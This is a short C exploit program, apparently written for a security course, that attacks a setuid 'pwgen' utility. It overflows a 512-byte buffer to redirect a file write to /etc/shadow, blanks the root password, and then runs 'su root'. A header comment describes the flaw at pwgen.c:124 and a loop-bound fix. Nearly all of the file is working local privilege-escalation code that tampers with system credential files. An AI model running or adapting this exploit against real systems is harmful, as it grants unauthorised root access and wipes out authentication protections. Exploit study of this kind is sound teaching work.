#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<string.h>

/**
 * Class B: buffer overflow
 *  
 *  Exploit method:
 *  overflows `char reason[512];` in get_reason() function
 *  and overrides `char stats_file[1024];` to the address of shadow file
 *  and override root password with root::::::::
 *  
 *  Fixes:
 *  This exploit uses a vulnerability in pwgen.c:124. When writing into `reason[512]` buffer,
 *  it loops upto 1023 times, causing it to write over `stats_file[1024]` buffer.
 *  Simple change on the range of the loop will fix the vulnerability.
 *  
 */
int main(int argc, char const *argv[])
{
	FILE *pwgen;
  
  char exploitStr[1024];
  // add \n at the end so that all 500s ' ' and '/log/../etc/shadow' are on a different line
  char override[] = "\nroot::::::::\n";
  int i=0;

  memset(exploitStr, 0, 1024);
  memset(exploitStr, ' ', 513);
  for(i = 0; i<strlen(override); i++)
  {
    exploitStr[i] = override[i];
  }

  // append shadow file address
  strcat(exploitStr, "/log/../etc/shadow");

  // run pwgen
	pwgen = popen("pwgen -w","w");

  // override root user authentication
	fprintf(pwgen, exploitStr);
	fclose(pwgen);

	system("su root");

	return 0;
}